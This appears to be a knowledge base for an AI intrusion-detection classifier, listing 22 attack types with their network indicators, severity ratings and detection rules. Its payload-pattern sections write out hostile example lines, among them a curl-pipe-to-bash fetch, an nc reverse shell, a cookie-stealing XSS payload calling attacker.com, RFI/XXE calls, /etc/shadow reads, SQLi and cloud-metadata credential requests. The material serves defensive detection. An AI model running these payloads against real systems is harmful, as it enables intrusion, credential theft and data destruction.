================================================================================
KNOWLEDGE BASE — CYBER ATTACK DETECTION (IDS-AI)
================================================================================
PURPOSE: This knowledge base is used by an AI classifier to analyze network
traffic logs and determine whether a connection is Normal, Suspicious, or
Malicious. Each entry describes an attack type with its network-level
indicators so the AI can match observed traffic patterns to known threats.

LOG FORMAT REFERENCE:
  src=<IP>:<port>  dst=<IP>:<port>  proto=<tcp|udp|icmp>  service=<name>
  conn_state=<state>  duration=<s>  src_bytes=<n>  dst_bytes=<n>
  missed=<n>  src_pkts=<n>  dst_pkts=<n>  http_status=<code>

CONNECTION STATE CODES:
  SF  = Normal full connection (SYN+data+FIN)
  S0  = SYN sent, no reply (likely scan or filtered)
  REJ = Connection rejected by destination
  RSTO/RSTR = Reset by originator/responder
  OTH = Partial/unknown connection

SEVERITY SCALE: LOW | MEDIUM | HIGH | CRITICAL
================================================================================


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 1. BACKDOOR / REMOTE ACCESS TROJAN (RAT)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  A backdoor is a covert communication channel installed on a compromised host
  that allows an attacker to execute commands, transfer files, or maintain
  persistent access without the victim's knowledge. RATs (Remote Access Trojans)
  are a specific category with full interactive control.

Network Indicators:
  - Non-standard or high destination ports (4444, 1337, 31337, 5555, 6666, 8888,
    9999, 12345, 6667, 1234)
  - Long-duration connections (duration > 30s) with low data volume (idle channel)
  - Small periodic packets at regular intervals (heartbeat/keep-alive)
  - Bidirectional traffic: src_bytes > 0 AND dst_bytes > 0 (interactive session)
  - Unusual protocol/service mismatch (e.g., HTTP traffic on non-port-80)
  - Connections to internal IPs from external sources on unusual ports
  - conn_state = SF with long duration and low byte count

Behavioral Patterns:
  - Persistent connection maintained over long periods
  - Commands sent in small bursts (src_bytes small), large responses (dst_bytes high)
  - Unusual times of connection (off-hours activity)
  - Encrypted or binary traffic on plaintext service ports

Severity: CRITICAL
Common Ports: 4444, 1337, 31337, 5555, 6666, 8888, 12345, 6667


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 2. DISTRIBUTED DENIAL OF SERVICE (DDoS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  A coordinated flood attack from multiple sources designed to exhaust target
  resources (bandwidth, CPU, memory, connections). DDoS differs from DoS by
  using a distributed botnet, making it harder to block by IP.

Network Indicators:
  - Very high src_pkts or dst_pkts (thousands per second)
  - Very high src_bytes with near-zero dst_bytes (one-directional flood)
  - Many connections from different IPs to the same destination
  - Short duration + very high packet count (volumetric attack)
  - Amplification attacks: small src_bytes, very large dst_bytes (ratio > 50x)
    — common with DNS (port 53), NTP (port 123), SSDP (port 1900)
  - UDP flood: proto=udp, large src_bytes, short duration, no response
  - SYN flood: conn_state=S0 (SYN with no reply), very high count, small bytes

Attack Sub-types:
  - Volumetric: overwhelm bandwidth (UDP/ICMP flood)
  - Protocol: exhaust connection tables (SYN flood, ping of death)
  - Application: target L7 (HTTP GET flood, Slowloris)
  - Amplification: leverage open resolvers (DNS, NTP, memcached amplification)

Severity: CRITICAL
Typical Ratio: src_bytes >> dst_bytes OR dst_bytes >> src_bytes (amplification)


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 3. DENIAL OF SERVICE (DoS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  A single-source attack aimed at crashing or degrading a service by sending
  more traffic than the target can handle. Unlike DDoS, it originates from
  one IP address.

Network Indicators:
  - Extremely high src_bytes or src_pkts from a single source IP
  - Very short duration connections with massive data volumes
  - Repeated identical connections to the same dst_port
  - conn_state=S0 (half-open) or REJ in large volume (resource exhaustion)
  - proto=icmp with large src_bytes (ICMP flood / ping of death)
  - Near-zero dst_bytes (server too busy to respond)
  - Slowloris pattern: long duration, tiny src_bytes, many connections

Severity: HIGH


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 4. PORT SCANNING / NETWORK RECONNAISSANCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Systematic probing of a target host to discover open ports and running
  services. Used as a precursor to a targeted attack. Common tools: Nmap,
  Masscan, Zmap.

Network Indicators:
  - Many connections from same src_ip to different dst_ports in rapid succession
  - Very short duration (duration ≈ 0) per connection
  - Minimal src_bytes and dst_bytes (just probe packets)
  - conn_state=S0 (no response), REJ, or RSTO in large numbers
  - src_pkts=1, dst_pkts=0 per connection (SYN-only scan)
  - Sequential or randomized port coverage across common ranges
  - proto=tcp SYN scan OR proto=udp for UDP scan

Scan Types:
  - SYN scan (stealth): conn_state=S0, no full handshake
  - Connect scan: conn_state=SF, full handshake on open ports
  - UDP scan: short connections, many REJ responses
  - XMAS/FIN scan: unusual TCP flags, no SYN

Severity: MEDIUM (reconnaissance phase — often precedes a real attack)


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 5. SQL INJECTION (SQLi)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Insertion of malicious SQL statements into input fields that are passed
  directly to a database query. Can result in unauthorized data access, data
  deletion, or full database takeover.

Network Indicators:
  - dst_port=80 or 443 (HTTP/HTTPS), service=http or ssl
  - http_request_body_len > 0 with special character patterns in payload
  - Abnormally large HTTP request body (http_request_body_len >> normal)
  - http_status_code=500 (server error from malformed query)
  - http_status_code=200 with unusually large response (data dump)
  - Multiple rapid requests with varied payloads to the same endpoint
  - Short duration with disproportionately large responses

Payload Patterns (in raw_log or HTTP body):
  - ' OR '1'='1  |  ' OR 1=1 --  |  1; DROP TABLE
  - UNION SELECT  |  UNION ALL SELECT
  - AND SLEEP()  |  AND BENCHMARK()  (time-based blind SQLi)
  - Information schema queries: SELECT * FROM information_schema.tables
  - Hex/base64 encoded payloads to evade WAF

Severity: HIGH


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 6. COMMAND INJECTION / OS INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Injection of operating system commands through vulnerable application inputs
  that are passed to a shell without sanitization. Allows full system
  compromise if the application runs with elevated privileges.

Network Indicators:
  - HTTP requests with shell metacharacters in parameters
  - Unusual response sizes indicating command output in HTTP body
  - http_status_code=200 with unusually large response (command output)
  - Requests to CGI scripts or endpoints that invoke system commands
  - Outbound connections from web server to unknown IPs (reverse shell)
  - Subsequent backdoor connections after initial injection

Payload Patterns:
  - ; ls -la  |  && cat /etc/passwd  |  | whoami
  - $(command)  |  `command`  (command substitution)
  - ; curl http://attacker.com/shell.sh | bash
  - nc -e /bin/sh attacker.com 4444  (reverse shell)
  - Encoded variants: %3B, %26%26, %7C

Severity: CRITICAL


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 7. BRUTE FORCE / CREDENTIAL STUFFING / PASSWORD SPRAYING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Automated attempts to gain unauthorized access by systematically trying
  passwords or credentials. Brute force tries all combinations; credential
  stuffing uses known leaked credentials; password spraying tries one common
  password across many accounts to avoid lockouts.

Network Indicators:
  - High number of connections from same src_ip to same dst_ip:dst_port
  - Short duration per connection with small src_bytes and dst_bytes
  - Repeated authentication failures (http_status_code=401 or 403)
  - Targeted ports: 22 (SSH), 21 (FTP), 23 (Telnet), 3389 (RDP),
    5900 (VNC), 25 (SMTP), 80/443 (web login), 3306 (MySQL)
  - conn_state=SF with immediate disconnect (fast fail)
  - High src_pkts relative to session duration (rapid-fire attempts)
  - Credential stuffing: requests from many different IPs to same endpoint

Password Spraying Pattern:
  - Low frequency per account (1-2 attempts) to evade lockout
  - Same password tried across many different dst_ips or accounts
  - Slower rate than brute force (evades rate limiting)

Severity: HIGH
Common Target Ports: 22, 21, 23, 3389, 5900, 25, 80, 443, 3306


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 8. CROSS-SITE SCRIPTING (XSS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Injection of malicious JavaScript or HTML into web pages viewed by other
  users. The malicious script executes in the victim's browser, allowing
  session hijacking, credential theft, or defacement.

Network Indicators:
  - dst_port=80 or 443, service=http
  - HTTP GET/POST with script tags or event handlers in parameters
  - Large http_response_body_len (server reflecting injected content)
  - Requests containing encoded script payloads (%3Cscript%3E)

Payload Patterns:
  - <script>alert(document.cookie)</script>
  - <img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>
  - javascript:eval(...)
  - <svg onload=...>  |  <body onpageshow=...>
  - DOM-based: #<script>...  (hash-based injection)

XSS Types:
  - Reflected: payload in URL/request, executed immediately
  - Stored: payload saved in database, executed for all visitors
  - DOM-based: client-side JavaScript manipulates the DOM

Severity: MEDIUM to HIGH (depends on application privileges)


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 9. CROSS-SITE REQUEST FORGERY (CSRF)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Tricks an authenticated user into unknowingly submitting a forged request
  to a web application. The server processes it as a legitimate request
  because it carries the user's valid session cookies.

Network Indicators:
  - POST requests to sensitive endpoints without CSRF token in body/header
  - Unusual Referer header (request originating from a third-party domain)
  - State-changing requests (password change, money transfer) with no user action
  - http_request_body_len small (simple form submission)

Payload Patterns:
  - POST /transfer amount=1000&to=attacker (no CSRF token)
  - <form action="https://victim.com/change-email" method="POST">
  - Missing X-CSRF-Token or _csrf headers on sensitive endpoints

Severity: MEDIUM


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
10. DIRECTORY TRAVERSAL / PATH TRAVERSAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Manipulation of file path parameters to access files and directories outside
  the web root. Can expose configuration files, private keys, and system files.

Network Indicators:
  - HTTP requests with ../ sequences in URL or parameters
  - Requests targeting known sensitive system paths
  - http_status_code=200 with large response (file contents returned)
  - http_status_code=403/404 with small response (access denied or not found)
  - Encoded traversal sequences in URL

Payload Patterns:
  - ../../etc/passwd  |  ../../../etc/shadow
  - ..\..\windows\system32\config\SAM  (Windows)
  - Encoded: %2e%2e%2f  |  %252e%252e%252f  (double URL encoding)
  - Null byte: ../../../etc/passwd%00  (bypass extension check)
  - Target files: /etc/passwd, /etc/hosts, /proc/self/environ, web.config

Severity: HIGH


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
11. FILE INCLUSION (LFI / RFI)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Local File Inclusion (LFI) forces the application to include a local file
  in its output. Remote File Inclusion (RFI) loads and executes a file from
  an external server, enabling full remote code execution.

Network Indicators:
  - File parameters pointing to absolute paths or remote URLs
  - RFI: outbound HTTP request from the server after initial request
  - Large http_response_body_len (file contents included in response)
  - http_status_code=500 on failed inclusion attempts
  - Connections to unknown external IPs from the server (RFI execution)

Payload Patterns:
  - LFI: ?page=../../etc/passwd  |  ?file=/var/log/apache2/access.log
  - RFI: ?page=http://attacker.com/shell.php
  - Log poisoning (LFI+exec): include server logs containing injected PHP
  - PHP wrappers: php://filter/convert.base64-encode/resource=/etc/passwd

Severity: CRITICAL (RFI) / HIGH (LFI)


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
12. SERVER-SIDE REQUEST FORGERY (SSRF)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Forces the server to make outbound requests to internal or external resources
  chosen by the attacker. Can access internal services, cloud metadata APIs,
  or bypass firewalls.

Network Indicators:
  - Requests from server to 127.0.0.1 / localhost / 169.254.x.x (cloud metadata)
  - HTTP requests to internal IP ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
  - Unusual outbound connections from application server to internal hosts
  - Connections to AWS metadata: 169.254.169.254, GCP: 169.254.169.254/metadata

Payload Patterns:
  - ?url=http://127.0.0.1:6379  (Redis internal service)
  - ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  - ?url=file:///etc/passwd
  - Bypass techniques: http://2130706433 (decimal IP), http://0177.0.0.01 (octal)

Severity: HIGH to CRITICAL


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
13. XML EXTERNAL ENTITY INJECTION (XXE)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Exploitation of XML parsers that process external entity references. Allows
  reading local files, performing SSRF, or causing denial of service through
  "Billion Laughs" entity expansion attacks.

Network Indicators:
  - HTTP POST with Content-Type: application/xml or text/xml
  - http_request_body_len > 0 with DOCTYPE or ENTITY declarations
  - http_response_body_len unusually large (file contents in response)
  - Subsequent unexpected outbound connections from server (SSRF via XXE)

Payload Patterns:
  - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/data">]>
  - Billion Laughs (DoS): nested entity expansion (lol1...lol9)
  - Blind XXE: out-of-band data exfiltration via DNS/HTTP

Severity: HIGH


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
14. PRIVILEGE ESCALATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Gaining higher access rights than originally granted. Horizontal escalation
  targets other users' resources; vertical escalation gains administrator or
  root privileges.

Network Indicators:
  - Access to admin endpoints (/admin, /root, /sudo, /superuser) by non-admin IPs
  - Sudden access to resources previously returning 403 after a period of 401s
  - API calls that modify roles, permissions, or group memberships
  - Access to internal management ports (8080, 8443, 9090, 4848) from external IPs
  - Unusual privilege-related queries or admin API calls in HTTP traffic

Behavioral Patterns:
  - Exploit of SUID binaries, sudo misconfigurations, kernel vulnerabilities
  - Token manipulation: JWT with modified claims (role:admin)
  - IDOR (Insecure Direct Object Reference): changing user ID in requests

Severity: CRITICAL


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
15. MALWARE / PAYLOAD OBFUSCATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Techniques used to hide or disguise malicious payloads from security tools.
  Obfuscated code is harder to detect by signature-based systems.

Network Indicators:
  - Unusually high ratio of entropy in HTTP body (encrypted/encoded payload)
  - Base64 or hex-encoded content in HTTP parameters or body
  - Binary or non-printable data in HTTP GET parameters
  - Known obfuscation patterns in http_request_body or URL

Payload Patterns:
  - eval(atob('base64string'))  (JavaScript)
  - \x68\x65\x6c\x6c\x6f  (hex-encoded)
  - PowerShell: -EncodedCommand, -Enc (base64 command)
  - Python: exec(compile(__import__('base64').b64decode(...)))
  - Polyglot payloads that are valid in multiple contexts (HTML+JS+SQL)

Severity: HIGH


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
16. MAN-IN-THE-MIDDLE (MITM) / ARP SPOOFING / DNS SPOOFING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  The attacker positions themselves between two communicating parties to
  intercept, read, or modify traffic. ARP spoofing redirects LAN traffic;
  DNS spoofing redirects domain resolutions to malicious IPs.

Network Indicators:
  - ARP Spoofing: unusual ARP replies mapping multiple IPs to same MAC
  - DNS Spoofing: DNS responses from unexpected source IPs (not the real resolver)
  - SSL/TLS certificate warnings (wrong cert for domain — MITM proxy)
  - Unexpected intermediate hops in traceroute
  - Traffic to internal gateway redirected to unknown IP
  - DNS queries answered too quickly (local cache poisoning)
  - SSL stripping: HTTPS downgraded to HTTP (port 443 → port 80 redirect)

Network Patterns:
  - proto=udp, dst_port=53, dst_bytes >> src_bytes (amplified DNS response)
  - Multiple DNS responses for same query from different src_ips
  - HTTP traffic on port 443 (SSL stripping indicator)

Severity: HIGH to CRITICAL


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
17. COMMAND AND CONTROL (C2) COMMUNICATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Communication channel between malware on a compromised host and the
  attacker's server (C2/C&C). Used to receive instructions, exfiltrate data,
  and coordinate botnets. Often disguised as legitimate traffic.

Network Indicators:
  - Periodic beaconing: regular short connections at fixed intervals to same IP
  - Unusual outbound connections to external IPs on non-standard ports
  - HTTP/HTTPS traffic with unusually uniform request intervals (jitter)
  - DNS-based C2: high frequency of DNS queries for unusual subdomains
  - Low and slow traffic: small regular packets to maintain channel
  - Domain Generation Algorithm (DGA): connections to random-looking domains
  - Long TCP sessions with minimal but periodic data exchange
  - IRC-based C2: connections to port 6667 (IRC) from workstations

Behavioral Patterns:
  - src_bytes small, dst_bytes small, duration very long
  - conn_state=SF with very low bytes per second
  - Beaconing interval: exactly 60s, 300s, 3600s (too regular = suspicious)

Severity: CRITICAL


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
18. DATA EXFILTRATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Unauthorized transfer of sensitive data from a compromised system to an
  external location controlled by the attacker. Often the final step in
  a data breach.

Network Indicators:
  - Large outbound src_bytes to external IP (high data volume exiting network)
  - dst_bytes << src_bytes ratio (sending much more than receiving)
  - Data transferred over unusual protocols: ICMP, DNS tunneling, SMTP
  - Outbound traffic at unusual hours to new/unknown destinations
  - DNS tunneling: very long DNS query names (> 50 chars), proto=udp port=53
  - Connections to cloud storage, pastebin, or file-sharing services from servers
  - Incremental transfers: many medium-sized connections over time to same IP

Covert Channels:
  - DNS tunneling: data encoded in DNS queries (high src_bytes for DNS)
  - ICMP tunneling: data in ICMP payload (proto=icmp with large src_bytes)
  - HTTPS exfiltration: blends with normal HTTPS traffic (hard to detect)
  - Steganography in image uploads (large http_request_body_len)

Severity: CRITICAL


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
19. LATERAL MOVEMENT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  After gaining initial access, the attacker moves through the network to
  reach higher-value targets. Uses stolen credentials, exploits, or legitimate
  admin tools to access additional systems.

Network Indicators:
  - Internal-to-internal connections on admin ports from unexpected sources
  - SMB traffic (port 445) or RDP (port 3389) from workstation to workstation
  - Pass-the-Hash / Pass-the-Ticket: authentication without password (Kerberos)
  - WMI remote execution: connections on port 135 (DCOM/WMI)
  - SSH connections between internal hosts that don't normally communicate
  - PowerShell remoting: WinRM port 5985/5986 from unexpected host
  - Service accounts connecting to many internal hosts in sequence

Common Tools Signatures:
  - PsExec: SMB + IPC$ share access + service creation (port 445)
  - Mimikatz: LSASS memory access (detectable via endpoint logs)
  - BloodHound: LDAP queries to domain controller (port 389/636)
  - Cobalt Strike: beaconing on port 80/443 with specific HTTP patterns

Severity: CRITICAL

20. RANSOMWARE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Malware that encrypts victim's files and demands ransom payment for
  decryption. Modern ransomware (double extortion) also exfiltrates data
  before encryption.

Network Indicators:
  - Large outbound transfers before encryption phase (exfiltration)
  - Connections to Tor network (port 9001, 9030) or onion services
  - C2 check-in to retrieve encryption key (small request, small response)
  - SMB scanning internally (port 445) for network shares to encrypt
  - DNS queries to known ransomware C2 domains
  - Sudden spike in file system activity (not directly visible in network logs
    but correlated with unusual SMB traffic)

Behavioral Phases:
  1. Initial access (phishing, exploit)
  2. Persistence + reconnaissance
  3. Lateral movement (SMB, RDP)
  4. Exfiltration (large outbound transfer)
  5. C2 key exchange (small connection)
  6. Encryption + ransom note

Severity: CRITICAL

21. CRYPTOJACKING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Unauthorized use of a victim's computing resources to mine cryptocurrency.
  Can run in browser (JavaScript) or as a background process after compromise.

Network Indicators:
  - Persistent connections to mining pool servers (ports 3333, 4444, 8888, 14444)
  - Stratum protocol: connection to pool.*.com or *.minexmr.com
  - High and sustained outbound traffic (steady stream of mining shares)
  - Connections from many hosts to the same mining pool IP
  - Long duration connections with periodic low-volume data exchange
  - proto=tcp, dst_port=3333 or 4444, long duration, regular data intervals

Common Mining Pools:
  - XMRig (Monero): pool.supportxmr.com, minexmr.com (port 4444)
  - Nicehash: stratum+tcp://*.nicehash.com (port 3353)

22. ARP / VLAN HOPPING / NETWORK SPOOFING
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Description:
  Low-level network attacks that manipulate Layer 2 protocols to intercept
  or redirect traffic. ARP spoofing maps attacker's MAC to target IP; VLAN
  hopping bypasses network segmentation.

Network Indicators:
  - Gratuitous ARP replies not triggered by requests
  - Same MAC address responding for multiple IPs
  - 802.1Q double-tagged frames (VLAN hopping)
  - Traffic appearing from unexpected VLANs or subnets
  - High volume of ARP traffic from a single MAC/IP

Severity: HIGH


================================================================================
 GLOBAL DETECTION RULES — NETWORK TRAFFIC ANALYSIS
================================================================================

BYTE RATIO ANALYSIS:
  - src_bytes >> dst_bytes (ratio > 10:1): likely DoS/DDoS or data exfiltration
  - dst_bytes >> src_bytes (ratio > 10:1): likely data download or amplification
  - Both near zero: likely scan or probe (conn_state=S0)
  - Both substantial and equal: likely interactive session (backdoor, SSH, RDP)

CONNECTION STATE ANALYSIS:
  - conn_state=S0 in volume: SYN scan, DoS SYN flood
  - conn_state=REJ in volume: port scan showing closed ports
  - conn_state=SF + long duration + low bytes: backdoor/C2 idle channel
  - conn_state=RSTO: connection reset (possible IDS evasion or exploit crash)

DURATION ANALYSIS:
  - duration ≈ 0 + low bytes: scan, probe, or failed connection
  - duration > 300s + low bytes: backdoor, C2 beaconing, idle tunnel
  - duration > 300s + high bytes: data exfiltration or streaming

PACKET COUNT ANALYSIS:
  - src_pkts >> dst_pkts: flooding attack (DoS/DDoS)
  - src_pkts = 1, dst_pkts = 0: SYN scan
  - src_pkts = dst_pkts (±10%): balanced interactive session

PORT RISK CLASSIFICATION:
  HIGH RISK: 4444, 1337, 31337, 12345, 6667 (common backdoor/RAT ports)
  ADMIN/MANAGEMENT: 22 (SSH), 3389 (RDP), 5900 (VNC), 23 (Telnet)
  DATABASE: 3306 (MySQL), 5432 (PostgreSQL), 27017 (MongoDB), 6379 (Redis)
  MINING: 3333, 4444, 8888, 14444 (cryptocurrency mining)
  C2/BOTNET: 6667, 6697 (IRC), 1080 (SOCKS proxy)

SEVERITY DECISION LOGIC:
  CRITICAL: Active exploitation, backdoor, ransomware, C2, data exfiltration
  HIGH:     Successful brute force, injection, privilege escalation, DoS
  MEDIUM:   Reconnaissance, suspicious patterns, failed attack attempts
  LOW:      Single anomalous packet, minor deviation from baseline

MULTI-INDICATOR ESCALATION:
  If multiple indicators from different categories are present simultaneously,
  escalate severity by one level. Example: port scan (MEDIUM) + subsequent
  backdoor connection to discovered port = CRITICAL attack chain.
